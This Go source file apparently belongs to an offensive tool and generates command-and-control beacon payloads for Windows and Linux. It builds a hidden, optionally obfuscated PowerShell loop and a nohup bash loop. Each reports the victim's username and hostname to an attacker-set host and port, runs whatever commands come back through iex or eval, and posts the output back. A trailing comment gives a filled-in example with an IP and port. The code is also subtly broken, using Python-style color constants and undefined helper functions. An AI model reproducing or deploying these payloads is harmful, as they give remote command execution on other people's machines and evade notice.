package main

import "math/rand"

func generate_random_id() string {
	var id string

	var chars string = "abcdef012345789"

	for i:=0;i<3;i++ {
		for ii:=0;ii<6;ii++ {
				id += string(chars[rand.Intn(len(chars) - 1)])
		}
		id += "-"
	}

	id = id[0:len(id) - 1]

	return id
}

func generate(os string, lhost string, lport string, obfuscate bool) string {
	switch os {
		case("windows"):
			if !obfuscate {
				return Fore.GREEN+`Start-Process $PSHOME\powershell.exe -ArgumentList { for (;;) { try {$i='`+generate_random_id()+`';$u=$env:USERNAME;$h=$env:COMPUTERNAME;$o='windows';$p='http://';$s='`+lhost+`:`+lport+`';$f=(15 -as [char])+(15 -as [char])+(255 -as [char]);$b=$f;$r=(iwr $p$s/$i/$u/$h/$o -UseBasicParsing -Method Post -Body $b).Content;if ($r -ne 'None') {try { $b = (iex $r 2>&1 | Out-String ); } catch {  $b = $_   } $r=(iwr $p$s/$i/$u/$h/$o -UseBasicParsing -Method Post -Body $b).Content}Sleep 3} catch {Sleep 14}} } -WindowStyle Hidden`+Fore.RESET
			} else {
				return Fore.GREEN+xobfuscate(`Start-Process $PSHOME\powershell.exe -ArgumentList { for (;;) { try {$var1=`+pws_makeshuffel(generate_random_id())+`;$var2=$env:USERNAME;$var3=$env:COMPUTERNAME;$var4='windows';$p=`+pws_makeshuffel("http://")+`;$s=`+pws_makeshuffel(lhost+`:`+lport)+`;$var6=(15 -as [char])+(15 -as [char])+(255 -as [char]);$var5=$var6;$var7=(iwr $p$s/$var1/$var2/$var3/$var4 -UseBasicParsing -Method Post -Body $var5).Content;if ($var7 -ne 'None') {try { $b = (iex $var7 2>&1 | Out-String ); } catch {  $var5 = $_   } $var7=(iwr $p$s/$var1/$var2/$var3/$var4 -UseBasicParsing -Method Post -Body $var5).Content}Sleep 3} catch {Sleep 14}} } -WindowStyle Hidden`)+Fore.RESET
			}
		case("linux"):
			return Fore.GREEN+`nohup `+"`"+`while true; do i="`+generate_random_id()+`"; u=$(whoami); h=$(hostname); o="linux"; p="http://"; s="`+lhost+`:`+lport+`"; f=$'\017\017\377'; b=$f; r=$(curl -s -X POST $p$s/$i/$u/$h/$o -d "$b"); [ "$r" != "None" ] && { b=$(eval $r 2>&1); r=$(curl -s -X POST $p$s/$i/$u/$h/$o -d "$b"); }; sleep 3; done`+"`"+` &`+Fore.RESET
		default:
			return "OSNx0"
	}
}

// for (;;) { try {$i="fedde1-01e5cb-1ea2aa";$u=$env:USERNAME;$h=$env:COMPUTERNAME;$o="windows";$p="http://";$s="192.168.178.175:8080";$f="$(15 -as [char])$(15 -as [char])$(255 -as [char])";$b=$f;$r=(iwr $p$s/$i/$u/$h/$o -UseBasicParsing -Method Post -Body $b).Content;if ($r -ne 'None') {try { $b = (iex $r 2>&1 | Out-String ); } catch {  $b = $_   } $r=(iwr $p$s/$i/$u/$h/$o -UseBasicParsing -Method Post -Body $b).Content}Sleep 3} catch {Sleep 14}}